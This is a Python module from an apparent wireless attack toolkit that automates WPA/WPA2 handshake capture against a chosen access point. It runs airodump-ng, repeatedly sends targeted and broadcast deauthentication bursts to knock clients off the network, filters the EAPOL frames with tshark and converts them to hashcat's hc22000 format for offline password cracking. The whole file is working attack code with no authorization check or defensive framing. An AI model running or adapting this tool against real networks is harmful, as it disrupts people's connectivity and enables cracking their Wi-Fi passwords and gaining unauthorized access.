"""WPA/WPA2 handshake capture: airodump-ng + deauth + tshark filter + hcxpcapngtool.
Always runs post-processing (tshark filter, hcxpcapngtool) even on early stop.

Deauth strategy (automatic):
  - If a target client is set: targeted burst (-c STA), then broadcast burst.
  - Otherwise: broadcast burst only.
This maximises the chance of catching the 4-way handshake without requiring
the user to pick a "mode"."""
from __future__ import annotations

import json
import os
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from _log_util import log, run_deauth_burst, strip_ansi

STATUS_INTERVAL = 10


def _is_stop_requested() -> bool:
    from attack_runner import is_stop_requested
    return is_stop_requested()


def run(config: dict, data_dir: Path) -> None:
    bssid = config["bssid"]
    channel = config["channel"]
    interface = config["interface"]
    client_mac = config.get("client_mac")
    timeout = config.get("timeout", 120)
    deauth_interval = config.get("deauth_interval", 30)
    deauth_count = config.get("deauth_count", 50)

    capture_prefix = str(data_dir / "capture")
    log_path = data_dir / "log.txt"

    # Handshake capture requires deauth; fallback to broadcast if no specific client
    if not client_mac:
        client_mac = "FF:FF:FF:FF:FF:FF"

    log(log_path, "=== Handshake Capture ===")
    log(log_path, f"bssid:     {bssid}")
    log(log_path, f"channel:   {channel}")
    log(log_path, f"interface: {interface}")
    log(log_path, f"client:    {client_mac}")
    log(log_path, f"timeout:   {timeout}s, deauth every {deauth_interval}s x{deauth_count}")

    _update_status(data_dir, "running", "starting airodump-ng")

    airodump_cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "-c", str(channel),
        "-w", capture_prefix,
        "--output-format", "pcap",
        interface,
    ]

    log(log_path, f"exec: {' '.join(airodump_cmd)}")
    airodump = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    start = time.time()
    stopped_early = False
    last_deauth = 0.0
    last_status = 0.0
    deauth_total = 0
    prev_cap_size = 0

    try:
        while time.time() - start < timeout:
            if _is_stop_requested():
                stopped_early = True
                log(log_path, "stop requested - finishing capture")
                _update_status(data_dir, "running", "stop requested - finishing capture")
                break

            elapsed = time.time() - start

            if elapsed - last_deauth >= deauth_interval:
                burst = run_deauth_burst(
                    log_path, interface, bssid, deauth_count, client_mac
                )
                deauth_total += burst
                log(log_path, f"deauth done (+{burst} frames, cumulative: {deauth_total})")
                _update_status(data_dir, "running", f"capturing + deauth ({int(elapsed)}s)")
                last_deauth = elapsed

            if airodump.poll() is not None:
                log(log_path, f"airodump-ng exited unexpectedly (code={airodump.returncode})")
                break

            if elapsed - last_status >= STATUS_INTERVAL:
                cap_file = _find_cap_file(data_dir)
                cap_size = cap_file.stat().st_size if cap_file else 0
                growth = cap_size - prev_cap_size
                log(log_path, f"  pcap: {cap_size:,} bytes (+{growth:,}), deauths: {deauth_total}")
                _update_status(data_dir, "running", f"capturing ({int(elapsed)}s, {cap_size:,} B)")
                prev_cap_size = cap_size
                last_status = elapsed
            time.sleep(2)
    finally:
        airodump.terminate()
        try:
            airodump.wait(timeout=10)
        except subprocess.TimeoutExpired:
            airodump.kill()
        log(log_path, f"airodump-ng stopped (exit={airodump.returncode})")

    duration_s = round(time.time() - start, 1)
    cap_file = _find_cap_file(data_dir)
    hs_pcap = data_dir / "handshake.pcap"
    hc22000 = data_dir / "handshake.hc22000"
    hs_count = 0
    handshake_found = False

    log(log_path, "--- Post-processing ---")

    if cap_file:
        cap_size = cap_file.stat().st_size
        log(log_path, f"capture file: {cap_file.name} ({cap_size:,} bytes)")

        _update_status(data_dir, "running", "filtering handshake with tshark")
        tshark_cmd = [
            "tshark", "-nr", str(cap_file),
            "-Y", f"eapol && wlan.addr == {bssid}",
            "-w", str(hs_pcap),
            "-F", "pcap",
        ]
        log(log_path, f"exec: {' '.join(tshark_cmd)}")
        try:
            r = subprocess.run(tshark_cmd, capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                log(log_path, f"tshark exited with code {r.returncode}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[:5]:
                    log(log_path, f"  tshark> {strip_ansi(line)[:200]}")
        except subprocess.TimeoutExpired:
            log(log_path, "tshark filter timed out")

        if hs_pcap.exists() and hs_pcap.stat().st_size > 0:
            hs_count = _count_eapol_messages(hs_pcap)
            handshake_found = hs_count >= 2
            log(log_path, f"EAPOL messages: {hs_count}, handshake: {'FOUND' if handshake_found else 'incomplete'}")
        else:
            log(log_path, "no EAPOL frames captured")

        _update_status(data_dir, "running", "converting to hc22000")
        try:
            hcx_cmd = ["hcxpcapngtool", "-o", str(hc22000), str(cap_file)]
            r = subprocess.run(hcx_cmd, capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                log(log_path, f"hcxpcapngtool exited with code {r.returncode}")
            if r.stdout.strip():
                for line in r.stdout.strip().splitlines()[:5]:
                    log(log_path, f"  hcxpcapngtool> {strip_ansi(line)[:200]}")
            if hc22000.exists():
                log(log_path, f"hc22000 created ({hc22000.stat().st_size:,} bytes)")
            else:
                log(log_path, "hcxpcapngtool: no hc22000 output")
        except subprocess.TimeoutExpired:
            log(log_path, "hcxpcapngtool timed out")
    else:
        log(log_path, "no capture file found - skipping post-processing")

    status = "HANDSHAKE FOUND" if handshake_found else "no handshake"
    log(log_path, f"=== Result: {status} | {duration_s}s | deauths: {deauth_total} ===")

    result = {
        "bssid": bssid,
        "channel": channel,
        "client_mac": client_mac,
        "handshake_found": handshake_found,
        "eapol_messages": hs_count,
        "capture_file": str(cap_file) if cap_file else None,
        "handshake_pcap": str(hs_pcap) if hs_pcap.exists() else None,
        "hc22000": str(hc22000) if hc22000.exists() else None,
        "duration_s": duration_s,
        "stopped_early": stopped_early,
    }
    (data_dir / "result.json").write_text(json.dumps(result, indent=2))


def _find_cap_file(data_dir: Path) -> Path | None:
    for ext in ("*.cap", "*.pcap", "*.pcapng"):
        caps = sorted(data_dir.glob(f"capture*{ext[1:]}"))
        if caps:
            return caps[-1]
    return None


def _count_eapol_messages(pcap_path: Path) -> int:
    try:
        r = subprocess.run(
            ["tshark", "-nr", str(pcap_path), "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
            capture_output=True, text=True, timeout=30,
        )
        return len(r.stdout.strip().splitlines()) if r.stdout.strip() else 0
    except Exception:
        return 0


def _update_status(data_dir: Path, status: str, progress: str) -> None:
    payload = {
        "status": status,
        "progress": progress,
        "started_at": os.environ.get("_RUNNER_STARTED_AT", ""),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    (data_dir / "status.json").write_text(json.dumps(payload, indent=2))
